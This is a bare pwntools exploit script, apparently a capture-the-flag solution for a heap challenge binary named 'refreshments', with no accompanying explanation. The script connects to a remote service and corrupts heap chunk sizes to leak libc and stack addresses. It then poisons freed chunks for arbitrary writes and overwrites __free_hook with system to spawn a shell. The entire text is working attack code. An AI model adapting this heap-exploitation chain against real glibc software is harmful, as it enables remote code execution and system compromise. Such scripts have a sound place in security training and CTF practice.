from pwn import *

context.binary = binary = ELF('./refreshments' ,checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

def fill_glass(option=b'1'):
	p.sendlineafter(b'>> ', option)

def empty_glass(idx):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b'empty: ', str(idx).encode())

def edit_glass(idx, data):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b'customize: ', str(idx).encode())
	p.sendafter(b'drink: ', data)

def view_glass(idx):
	p.sendlineafter(b'>> ', b'4')
	p.sendlineafter(b'glass: ', str(idx).encode())
	p.recvuntil(b'content: ')
	return p.recvline()[:-1]


#p = process()
p = remote('94.237.57.211', 41356)

for _ in range(4):
	fill_glass()

edit_glass(0, b'\x00'*0x58+b'\xc1')
empty_glass(1)
fill_glass()

libc_leak = u64(view_glass(2)[:8])
libc.address = libc_leak - 0x399b78
info(f'libc leak @ {hex(libc_leak)}')
info(f'libc @ {hex(libc.address)}')

fill_glass()
empty_glass(5)
edit_glass(2, p64(libc.address+0x5c1c1b))  # Remote offset
#edit_glass(2, p64(libc.address+0x622c1b)) # Local offset
fill_glass()

edit_glass(0, b'\x00'*0x58+b'\x21')
edit_glass(4, b'\x00'*0x18+b'\x41')
empty_glass(4)

fill_glass()

stack_leak = u64(view_glass(7)[-3:]+view_glass(7)[:5])
info(f'stack leak @ {hex(stack_leak)}')

empty_glass(6)
edit_glass(2, p64(stack_leak-0x1a0))
fill_glass()
fill_glass(option=b'1'+b'\x00'*15+b'\x6f'+b'\x00'*6)

edit_glass(2, b'/bin/sh\x00')
data = view_glass(9)[:0x28]
edit_glass(9, data+b'\xff'*0x10+p64(libc.symbols.__free_hook))
edit_glass(0, p64(libc.symbols.system))
empty_glass(2)

p.interactive()
